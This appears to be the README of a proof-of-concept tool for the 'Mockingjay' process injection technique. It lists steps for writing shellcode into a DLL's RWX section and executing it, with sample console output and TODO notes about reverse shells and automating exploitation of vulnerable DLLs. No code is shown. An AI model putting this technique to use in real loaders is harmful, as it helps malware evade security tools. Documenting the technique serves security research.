# Mockingjay-POC

PoC for the Mockingjay injection technique (https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution).

What this code does :

1. Find the offset of the RWX section in the DLL passed as an argument
2. Find the size of the RWX section in the DLL passed as an argument
3. Write Shellcode into the RWX section of the DLL passed as an argument
4. Execute Shellcode from the RWX section of the DLL passed as an argument


### Usage
```ps1
PS C:\Users\admin\source\repos\Mockingjay-POC\x64\Release> .\Mockingjay-POC.exe
MOCKINGJAY SUPER ASCII ART

Error: Please provide the path to the DLL as a positional argument.
Usage: C:\Users\admin\source\repos\Mockingjay-POC\x64\Release\Mockingjay-POC.exe PATH_TO_DLL

--------------------------------------------------------------------------------------------

PS C:\Users\admin\source\repos\Mockingjay-POC\x64\Release> .\Mockingjay-POC.exe 'C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TeamFoundation\Team Explorer\Git\usr\bin\msys-2.0.dll'
MOCKINGJAY SUPER ASCII ART

Base Adress : 210040000
Section Offset : 1ec000
Size of RWX section : 14848
Address of RWX Section : 000000021022C000
RWX section starts at 000000021022C000 and ends at 000000021022FA00
Size of RWX section : 14848
Size of shellcode : 461
461 bytes of Sh3llc0d3 written to RWX Memory Region
```


#### TODO
- Fix THREAD mess. For now, working great with simple calc shellcode but with a reverse shell, threads are not "independant" and parent one is stuck
- Add RWXFinder in this code to do some kind of all-in-one program that will find vulnerable DLL, and then exploit them
